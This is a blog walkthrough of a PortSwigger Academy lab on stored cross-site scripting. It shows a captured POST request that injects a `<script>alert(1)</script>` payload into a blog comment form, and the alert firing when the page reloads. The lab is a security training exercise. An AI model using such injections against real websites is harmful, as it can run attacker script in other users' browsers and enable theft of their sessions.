---
title: "Stored XSS into HTML context with nothing encoded Walkthrough"
description: "Do you really know about Stored XSS ??"
date:  2024-09-28
categories: [Walkthrough]
tags: [PortSwigger, Academy , Lab , PortSwigger Academy Lab , XSS , Cross Site Scripting, Stored XSS , HTML] 
image :
    path : https://i.imghippo.com/files/Gg1FK1727518360.gif
---



#### <span style="color: orange;"><b># What do you understand by Stored XSS in first place ?</b></span>

Stored cross-site scripting, often referred to as second-order or persistent XSS, occurs when an application saves data from an untrusted source and later incorporates it into its HTTP responses in an unsafe manner.

Cross-Site Scripting (XSS) is a security vulnerability that arises when an application fails to properly sanitize user input, allowing an attacker to inject malicious scripts. To mitigate XSS, it's crucial to validate, sanitize, and encode user input. I recommend reading up on this topic to gain a deeper understanding. Here's a link to my latest [blog on XSS](https://archtrmntorr.github.io/posts/XXS-For-Beginners-101/).


<span style="color: Green;"><b>Objective :</b></span>

```
we have to exploit the Stored CRoss-site Vulnerability in the comment functionality , and have to pop up with the *alert* javascript function
```

![[Image]](https://i.imghippo.com/files/BhZG71727519335.png)

-> Let's start one of the example lab of reflected xss "Stored XSS into HTML context nothing encoded"

![[Image]](https://i.imghippo.com/files/5pOMo1727519333.png)


- as mention , we have to look into the comment functionality of the website , let's enter some random data in the input section , and see how our request goes . 

![[Pasted image 20240720172150.png]](https://i.imghippo.com/files/K9SGW1727519322.png)

- Everything seems normal , our request made to the server  and our is stored on the website server , let try to inject malicious payload that can lead to alert an popup .
- let's inject our payload in the comment section , and get the request from the burp tool.

```
POST /post/comment HTTP/2
Host: 0a7c00f7035d95d581390c3700630095.web-security-academy.net
Cookie: session=TziDVGSAUJJjWzvTbDNLKfnJcBLWfvaz
Content-Length: 166
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: https://0a7c00f7035d95d581390c3700630095.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7c00f7035d95d581390c3700630095.web-security-academy.net/post?postId=7
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=kzCJNSxuSQOI3Nev2NVAF47xorMf4luB&postId=7&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=nothing&email=nothign%40gmail.com&website=http%3A%2F%2Fnothing.com
```

- after injection the payload everything seems normal as before until refresh the page and sees an pop comes out and our xss payload got triggered  
- after going to that page again i got xss triggered

![[Pasted image 20240720172747.png]](https://i.imghippo.com/files/FidzU1727519328.png)

- This is how lab is solved , this type of Getting a POPUP  , we mostly submit during the POC of xss in bug bounty program where we don't just popup alert , instead we weaponize our payload and increase the impact or severity . 

![[Pasted image 20240720172907.png]](https://i.imghippo.com/files/Lwv6V1727519334.png)




- To learn `impact of stored XSS attacks` , `stored XSS in different contexts` and `How to find and test for stored XSS vulnerabilities` [blog on XSS](https://archtrmntorr.github.io/posts/XXS-For-Beginners-101/)

<br>

-------------------------------------------------------------


##### <span style="color: Green;"><b># Final Thoughts</b></span>
<br>
I hope this space continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts—my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on
[Linkedin](https://www.linkedin.com/in/hitesh-sharma-413862245) and [Twitter](https://twitter.com/archtrmntor)